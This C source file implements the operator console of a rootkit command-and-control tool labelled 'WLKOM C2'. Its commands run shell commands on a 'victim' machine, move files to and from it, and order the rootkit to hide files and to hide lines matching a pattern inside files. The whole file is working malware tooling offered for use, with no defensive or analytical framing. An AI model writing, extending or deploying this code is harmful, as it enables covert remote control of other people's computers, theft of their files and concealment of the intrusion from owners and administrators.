#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include "commands.h"
#include "server.h"

/* ─── Helper: read a full file into a buffer ─── */

static char *read_file(const char *path, size_t *len)
{
    FILE *f = fopen(path, "rb");
    if (!f)
        return NULL;
    fseek(f, 0, SEEK_END);
    *len = ftell(f);
    rewind(f);
    char *buf = malloc(*len);
    if (!buf) {
        fclose(f);
        return NULL;
    }
    fread(buf, 1, *len, f);
    fclose(f);
    return buf;
}

/* ─── Helper: write a full buffer to a file ─── */

static int write_file(const char *path, const char *buf, size_t len)
{
    FILE *f = fopen(path, "wb");
    if (!f)
        return -1;
    fwrite(buf, 1, len, f);
    fclose(f);
    return 0;
}

/* ─── Print prompt ─── */

static void print_prompt(void)
{
    printf("\n\033[1;32mWLKOM C2\033[0m > ");
    fflush(stdout);
}

/* ─── Print help ─── */

static void print_help(void)
{
    printf(
        "\n"
        "  \033[1mAvailable commands:\033[0m\n"
        "  exec <cmd>                Execute a shell command on the victim\n"
        "  upload <local> <remote>   Upload a local file to the victim\n"
        "  download <remote> <local> Download a file from the victim\n"
        "  hide_file <name>          Hide a file/dir from ls\n"
        "  unhide_file <name>        Unhide a file/dir\n"
        "  hide_line <file> <pat>    Hide lines containing <pat> in <file>\n"
        "  unhide_line <file> <pat>  Unhide lines\n"
        "  ping                      Ping the rootkit\n"
        "  help                      Show this help\n"
        "  exit                      Disconnect\n"
        "\n"
    );
}

/* ─── Parse and dispatch commands ─── */

static int dispatch(client_t *c, char *line)
{
    /* Trim trailing newline */
    line[strcspn(line, "\n")] = '\0';

    if (strlen(line) == 0)
        return 0;

    /* Tokenize */
    char *args[8];
    int   argc = 0;
    char *tok  = strtok(line, " ");
    while (tok && argc < 8) {
        args[argc++] = tok;
        tok = strtok(NULL, " ");
    }

    if (argc == 0)
        return 0;

    const char *cmd = args[0];

    /* ── ping ── */
    if (strcmp(cmd, "ping") == 0) {
        send_packet(c->fd, CMD_PING, NULL, 0);
        uint8_t  op;
        char    *resp     = NULL;
        uint32_t resp_len = 0;
        if (recv_packet(c->fd, &op, &resp, &resp_len) == 0 &&
            op == CMD_PONG)
            printf("PONG\n");
        else
            printf("No response\n");
        free(resp);
        return 0;
    }

    /* ── exec ── */
    if (strcmp(cmd, "exec") == 0) {
        if (argc < 2) {
            printf("Usage: exec <command>\n");
            return 0;
        }
        /* Rejoin args */
        char full[1024] = { 0 };
        for (int i = 1; i < argc; i++) {
            strncat(full, args[i], sizeof(full) - strlen(full) - 1);
            if (i < argc - 1)
                strncat(full, " ", sizeof(full) - strlen(full) - 1);
        }
        send_packet(c->fd, CMD_EXEC, full, strlen(full));
        uint8_t  op;
        char    *resp     = NULL;
        uint32_t resp_len = 0;
        if (recv_packet(c->fd, &op, &resp, &resp_len) == 0) {
            printf("%.*s\n", (int)resp_len, resp ? resp : "");
        }
        free(resp);
        return 0;
    }

    /* ── upload ── */
    if (strcmp(cmd, "upload") == 0) {
        if (argc < 3) {
            printf("Usage: upload <local_path> <remote_path>\n");
            return 0;
        }
        size_t  file_len;
        char   *file_data = read_file(args[1], &file_len);
        if (!file_data) {
            printf("Cannot read local file: %s\n", args[1]);
            return 0;
        }
        size_t  path_len   = strlen(args[2]) + 1;
        size_t  total_len  = path_len + file_len;
        char   *payload    = malloc(total_len);
        if (!payload) {
            free(file_data);
            return 0;
        }
        memcpy(payload, args[2], path_len);
        memcpy(payload + path_len, file_data, file_len);
        free(file_data);
        send_packet(c->fd, CMD_UPLOAD, payload, total_len);
        free(payload);

        uint8_t  op;
        char    *resp     = NULL;
        uint32_t resp_len = 0;
        if (recv_packet(c->fd, &op, &resp, &resp_len) == 0)
            printf("Upload: %s\n", resp ? resp : "?");
        free(resp);
        return 0;
    }

    /* ── download ── */
    if (strcmp(cmd, "download") == 0) {
        if (argc < 3) {
            printf("Usage: download <remote_path> <local_path>\n");
            return 0;
        }
        send_packet(c->fd, CMD_DOWNLOAD, args[1], strlen(args[1]));
        uint8_t  op;
        char    *resp     = NULL;
        uint32_t resp_len = 0;
        if (recv_packet(c->fd, &op, &resp, &resp_len) == 0) {
            if (resp && strncmp(resp, "FAIL", 4) != 0) {
                write_file(args[2], resp, resp_len);
                printf("Downloaded %u bytes → %s\n", resp_len, args[2]);
            } else {
                printf("Download failed\n");
            }
        }
        free(resp);
        return 0;
    }

    /* ── hide_file ── */
    if (strcmp(cmd, "hide_file") == 0) {
        if (argc < 2) { printf("Usage: hide_file <name>\n"); return 0; }
        send_packet(c->fd, CMD_HIDE_FILE, args[1], strlen(args[1]));
        printf("Hide file request sent: %s\n", args[1]);
        return 0;
    }

    /* ── unhide_file ── */
    if (strcmp(cmd, "unhide_file") == 0) {
        if (argc < 2) { printf("Usage: unhide_file <name>\n"); return 0; }
        send_packet(c->fd, CMD_UNHIDE_FILE, args[1], strlen(args[1]));
        printf("Unhide file request sent: %s\n", args[1]);
        return 0;
    }

    /* ── hide_line ── */
    if (strcmp(cmd, "hide_line") == 0) {
        if (argc < 3) {
            printf("Usage: hide_line <filepath> <pattern>\n");
            return 0;
        }
        size_t  flen    = strlen(args[1]) + 1;
        size_t  plen    = strlen(args[2]);
        size_t  total   = flen + plen;
        char   *payload = malloc(total);
        if (!payload) return 0;
        memcpy(payload, args[1], flen);
        memcpy(payload + flen, args[2], plen);
        send_packet(c->fd, CMD_HIDE_LINE, payload, total);
        free(payload);
        printf("Hide line request sent\n");
        return 0;
    }

    /* ── unhide_line ── */
    if (strcmp(cmd, "unhide_line") == 0) {
        if (argc < 3) {
            printf("Usage: unhide_line <filepath> <pattern>\n");
            return 0;
        }
        size_t  flen    = strlen(args[1]) + 1;
        size_t  plen    = strlen(args[2]);
        size_t  total   = flen + plen;
        char   *payload = malloc(total);
        if (!payload) return 0;
        memcpy(payload, args[1], flen);
        memcpy(payload + flen, args[2], plen);
        send_packet(c->fd, CMD_UNHIDE_LINE, payload, total);
        free(payload);
        printf("Unhide line request sent\n");
        return 0;
    }

    /* ── help ── */
    if (strcmp(cmd, "help") == 0) {
        print_help();
        return 0;
    }

    /* ── exit ── */
    if (strcmp(cmd, "exit") == 0 || strcmp(cmd, "quit") == 0)
        return -1;

    printf("Unknown command: %s  (type 'help')\n", cmd);
    return 0;
}

/* ─── Main interactive loop ─── */

void commands_loop(client_t *c)
{
    print_help();

    char line[1024];
    while (c->connected && c->authed) {
        print_prompt();

        if (!fgets(line, sizeof(line), stdin))
            break;

        if (dispatch(c, line) < 0)
            break;
    }
}
